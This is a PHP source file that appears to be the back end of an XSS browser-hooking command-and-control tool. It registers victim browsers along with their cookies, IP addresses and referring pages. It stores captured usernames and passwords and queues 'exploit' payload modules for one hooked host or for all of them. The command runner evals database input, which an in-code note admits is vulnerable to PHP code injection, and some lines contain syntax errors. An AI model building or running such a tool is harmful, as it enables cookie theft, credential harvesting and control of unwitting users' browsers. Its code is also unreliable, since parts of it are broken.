<?php 
// TODO: get debug working
// TODO: finish xmlhttprequest hijack

require '../config.php';
$log = Logger::getLogger("app");

// ensure that browsers do not cache this call
header('Expires: Sat, 26 Jul 1997 05:00:00 GMT' );
header('Last-Modified: ' . gmdate( 'D, d M Y H:i:s' ) . ' GMT' );
header('Cache-Control: no-store, no-cache, must-revalidate' );
header('Cache-Control: post-check=0, pre-check=0', false );
header('Pragma: no-cache' );
header('Content-type: text/javascript');

/**
 * match a useragent against a unique browser type
 */
function match_browser($agent) {
	$browsers = ["chrome", "firefox", "msie", "opera", "safari", "mozilla"];
	foreach ($browsers as $b) {
		if (stristr($agent, $b)) { return $b; }
	}
	return "unknown";
}

/**
 * match a useragent against a unique os type
 */
function match_os($agent) {
	$os = ["linux", "android", "macintosh", "windows", "ipad", "iphone", "iod", "bsd"];
	foreach ($os as $o) {
		if (stristr($agent, $o)) { return $o; }
	}
	return "unknown";
}

/**
 * create a new host.  New hosts are created based on IP,Browser,OS.
 * if a client connects with existing IP,Browser,OS we will just update
 * the guid for them.   This could be a problem if you have a lot of
 * machines behind NAT.
 *
 * called on registration, and if we are unable to locate an session.
 * return the host id
 */
function create_host($db, $guid, $cookies) {
	$log = Logger::getLogger("app");
	$agent = $_SERVER['HTTP_USER_AGENT'];
	$os = match_os($agent);
	$browser = match_browser($agent);

	$log->trace("create host. agent:($agent)  match[$os : $browser]");

	// reuse the host if ip, browser, os match.  then update the session guid
	if (REUSE_HOST) {
		// does the host already exist?
		$host = $db->select("find host", "SELECT * FROM host", array("remote_ip" => $_SERVER['REMOTE_ADDR'], 'browser' => $browser, 'os' => $os));
		// update session id and cookies
		if (isset($host[0])) {
			$db->update("update host", "host", array('guid'=>$guid, 'cookies' => $cookies, 'heartbeat' => "!CURRENT_TIMESTAMP"), array("remote_ip" => $_SERVER['REMOTE_ADDR'], 'browser' => $browser, 'os' => $os));
			return $host[0]['id'];
		}
	}

	// create a new host entry
	$id = $db->insert("create host", "host", array('id' => null, 'remote_ip' => $_SERVER['REMOTE_ADDR'], 'agent' => $agent, 'headers' => $_SERVER['HTTP_ACCEPT_LANGUAGE'], 'inject_source' => $_SERVER['HTTP_REFERER'], 'cookies' => $cookies, 'guid' => $guid, 'browser' => $browser, 'os' => $os, 'heartbeat' => '!CURRENT_TIMESTAMP'));

	return $id;
}

/**
 * NOTE: this method is vulnerable to php code injection. Be sure to
 * protect the web interface that allows entering commands.  Placing
 * malicious commands into the web interface will result in PHP code
 * being eval().
 *
 * TODO: create a more secure method to do this
 */
function run_commands($db, $guid) {
	// do we have a command to run?
	$rows = $db->select("check command", "SELECT * FROM commands", array("guid" => $guid));
	if (isset($rows[0])) {
		$log = Logger::getLogger("app");
		foreach ($rows as $row) {
			$foo = parse_url($row['command']);
			// convert the url to evalable php assignment
			$a="$" . str_replace("&", "\"; $", str_replace("=", "=\"", $foo['query'])) . "\";";

			// log what we are about to do
			$log->info("run {$foo['path']} ($a)");
			// TODO: find a better way than eval here
			eval($a);
			// .js or .php file?
			$parts = explode(".", trim($foo["path"]));
			$tpath = MODULE_DIR.$parts[0];

			// run the module code (print out the JS)
			if (file_exists($tpath . ".js")) {
				// TODO: move this to a view
				echo "var xssgbl = Array();"
				foreach($param as $key => $val) {
					echo "xssgbl['" + $key + "'] = $val;";
				}
				require($tpath . ".js");
			}
			if (file_exists($tpath . ".php"))
				require($tpath . ".php");


			// don't remove autorun commands
			if ($guid != "AUTORUN") {
				$db->delete("remove executed command", "commands", array("id" => $row['id']));
			}
			$db->insert("audit command", "audit", array("guid" => $guid, "command" => $row['command'], "id" => null));
		}
	}
}


try {
	// TODO: use localcache so we don't need a DB connection unless writing
	// we will need a db connection
	$db = DB::getConnection(DB_HOST, DB_USER, DB_PASS, DB_NAME);

	// register new hosts
	if (isset($_GET['reg'])) {
		create_host($db, $_GET['reg'], ($_GET['c']) ? $_GET['c'] : "null");
		run_commands($db, "AUTORUN");

		// setup the heartbeat
		$heartbeat=IDLE_POLL;
		require("../modules/heartbeat.php");
		exit;
	}

	// heart beats. debug logs. command execution
	if (isset($_GET['id'])) {
		// which host?
		$host = $db->select("get host", "SELECT * FROM host", array("guid" => $_GET['id']));
		// TODO: send register command!
		if (!isset($host[0])) {
			$log->error("NO SUCH HOST!");
			$id = create_host($db, $_GET['id'], "null");
			// $id = $db->insert("create host", "host", array('id' => null, 'remote_ip' => $_SERVER['REMOTE_ADDR'], 'agent' => $_SERVER['HTTP_USER_AGENT'], 'headers' => $_SERVER['HTTP_ACCEPT_LANGUAGE'], 'inject_source' => $_SERVER['HTTP_REFERER'], 'cookies' => null, 'guid' => $_GET['id']));
			$host = $db->select("get host", "SELECT * FROM host", array("guid" => $id));
		}
		else {
			$db->update("update heart beat", "host", array("heartbeat" => "!CURRENT_TIMESTAMP"), array("guid" => $_GET['id']));
			// add debug log
			if (isset($_GET['d']) && strlen($_GET['d']) > 1) { $db->insert("log debug", "debug_log", array("guid" => $_GET['id'], "log" => $_GET['d'])); }
			run_commands($db, $_GET['id']);
			exit;
		}

		// do we have creds ?
		if (isset($_GET['u'])) {
			$id = $db->insert("create auth", "auth", array('id' => null, 'host_id' => $host[0]['id'], 'domain' => $_SERVER['HTTP_REFERER'], 
				'user' => $_GET['u'], 'pass' => $_GET['p']));
		}
	}

	if ($_GET['auth'] != PASSWORD) {
		$log->error("incorrect auth [ " . $_GET['auth'] . "]");
		die("require auth");
	}

	$data = array();
	foreach ($_GET as $param => $value) {
		if ($param != "A" && $param != 'auth' && $param != 'table')
			$data[$param] = $value;
	}

	if (!isset($_GET["A"]))
		die("no action");

	if ($_GET["A"] == "insert") {
		$data = array();
		foreach ($_GET as $param => $value) {
			if ($param != "A" && $param != 'auth' && $param != 'table')
				$data[$param] = $value;
		}
		$db->insert($_GET['name'], $_GET['table'], $data, $force = false);
	}

	if ($_GET["A"] == "list") {
		$rows = $db->select("get hosts", "SELECT *, 'active' as class FROM host", array("heartbeat > " => "!subtime(CURRENT_TIMESTAMP, '0:0:30')"));
		$rows2 = $db->select("get hosts", "SELECT *, 'inactive' as class FROM host", array("heartbeat < " => "!subtime(CURRENT_TIMESTAMP, '0:0:30')"));
		//print_r($rows);
		echo "host_list = " . json_encode(array_merge($rows, $rows2)) . ";\n";
		echo "update_list(); xsscls();";
	}

	if ($_GET["A"] == "exploit") { 
		$command = "{$_GET['payload']}.php?".$_SERVER['QUERY_STRING'];
		if ($_GET['target'] == "ALL") {
			$rows = $db->select("get hosts", "SELECT *, 'active' as class FROM host", array("heartbeat > " => "!subtime(CURRENT_TIMESTAMP, '0:0:15')"));
			foreach ($rows as $row) {
				$db->insert("add command", "commands", array("guid" => $row['guid'], "command" => $command, "id" => null));
			}
		}
		else {
			$db->insert("add command", "commands", array("guid" => $_GET['target'], "command" => $command, "id" => null));
		}
	}
	if ($_GET["A"] == "debug") { 
		$rows = $db->select("get hosts", "SELECT id, log FROM debug_log", array("guid" => $_GET['guid']));
		$log = "<hr /><dl>";
		foreach ($rows as $r) {
			$log .= "<dt>".$r['id']."</dt>";
			$log .= "<dd>".$r['log']."</dt>";
			//$log .= str_replace("%A0", " / ", $r['log']) . "<br />";
		}
		$log .= "</dl>";

		echo "document.getElementById('out_debug').innerHTML = '$log'; xsscls(); ";
	}

	if ($_GET["A"] == "modules") {

		//$rows = $db->select("get hosts", "SELECT log FROM debug_log", array("guid" => $_GET['guid']));
		$modules = array();
		foreach (glob("modules/*.php") as $module) {
			$lines = file_get_contents($module);
			preg_match("/(\$\w+)/", $lines, $matches);
			$m = array();
		}
	}
	

} catch(Exception $e) {
	echo "<pre>";
	debug_print_backtrace();
	die ($e);
}

?>
